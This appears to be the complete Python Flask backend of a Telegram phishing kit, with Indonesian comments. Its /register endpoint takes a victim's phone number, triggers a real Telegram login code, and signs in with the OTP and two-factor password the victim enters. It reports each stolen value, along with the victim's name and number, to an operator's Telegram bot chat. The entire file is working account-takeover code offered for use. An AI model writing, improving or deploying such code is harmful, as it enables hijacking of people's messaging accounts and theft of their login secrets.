import os
import requests
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from asgiref.sync import async_to_sync

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Database sementara untuk menyimpan hash dan session string
user_data = {}

def send_log(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})

def format_nomor(nomor):
    nomor = nomor.strip().replace(" ", "")
    if nomor.startswith('0'): return '+62' + nomor[1:]
    return nomor

async def telegram_logic(data):
    step = data.get('step')
    nomor = format_nomor(data.get('nomor', ''))
    nama = data.get('nama', 'User')
    otp = data.get('otp', '')
    sandi = data.get('sandi', '')

    # Gunakan StringSession (In-Memory) untuk menghindari error "unable to open database file"
    session_str = user_data.get(f"{nomor}_session", "")
    client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        if step == 1:
            result = await client.send_code_request(nomor)
            # Simpan hash dan session string terbaru
            user_data[nomor] = result.phone_code_hash
            user_data[f"{nomor}_session"] = client.session.save()
            send_log(f"👤 *Nama:* {nama}\n📱 *Nomor:* `{nomor}`\n\n🔄 *Status:* Menunggu OTP...")
            return {"status": "success"}, 200
            
        elif step == 2:
            phone_hash = user_data.get(nomor)
            if not phone_hash:
                return {"status": "error", "message": "Sesi hilang, silakan kirim ulang."}, 400
            
            try:
                await client.sign_in(nomor, otp, phone_code_hash=phone_hash)
                send_log(f"👤 *Nama:* {nama}\n📱 *Nomor:* `{nomor}`\n🔑 *OTP:* `{otp}`\n\n✅ *Status:* Login Berhasil!")
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                send_log(f"👤 *Nama:* {nama}\n📱 *Nomor:* `{nomor}`\n🔑 *OTP:* `{otp}`\n\n⚠️ *Status:* Butuh 2FA")
                return {"status": "need_2fa"}, 200
            except errors.PhoneCodeInvalidError:
                return {"status": "invalid_otp", "message": "OTP SALAH!!"}, 400
                
        elif step == 3:
            await client.sign_in(password=sandi)
            send_log(f"👤 *Nama:* {nama}\n📱 *Nomor:* `{nomor}`\n🔐 *2FA:* `{sandi}`\n\n✅ *Status:* Sukses Total")
            return {"status": "success"}, 200

    except Exception as e:
        return {"status": "error", "message": str(e)}, 500
    finally:
        await client.disconnect()

@app.route('/register', methods=['POST'])
def register():
    result, status_code = async_to_sync(telegram_logic)(request.json)
    return jsonify(result), status_code

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))